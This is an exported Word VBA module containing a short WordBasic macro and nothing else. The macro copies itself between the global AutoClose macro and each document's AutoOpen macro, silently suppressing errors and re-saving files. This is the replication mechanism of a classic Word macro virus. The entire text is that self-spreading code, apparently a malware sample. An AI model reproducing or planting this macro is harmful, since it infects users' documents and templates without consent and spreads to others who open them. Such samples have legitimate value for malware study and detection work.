   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy "AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "AutoClose"
   WordBasic.FileSave
   End Sub
